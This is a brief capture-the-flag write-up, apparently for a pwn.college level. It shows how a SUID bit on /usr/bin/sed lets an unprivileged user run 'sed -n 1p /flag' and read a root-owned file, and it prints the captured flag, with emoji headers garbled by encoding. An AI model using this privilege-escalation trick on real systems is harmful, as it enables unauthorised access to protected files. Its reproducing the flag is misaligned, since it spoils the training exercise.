## üß† Summary:
The challenge abuses a SUID bit set on `/usr/bin/sed`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## üîç Enumeration

```bash
ls -l /usr/bin/sed
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/sed
```

- The `s` in `-rws` indicates it's a SUID binary.
- `sed` runs with **root privileges**.

## üöÄ Exploitation

The `sed` command (short for Stream EDitor) is a powerful Linux tool used for searching, substituting, inserting, and deleting text in a stream or file.

It‚Äôs ideal for on-the-fly editing or automating changes in scripts.

sed'd -n option allows user to printf specific line of a file , we can use this to reveal the flag.

```bash
sed -n '1p' /flag
```

Output:
```
pwn.college{IduzLBGf7GdgVPLRPtiQOvJGNYS.ddzNxwSM0IzMyEzW}
```
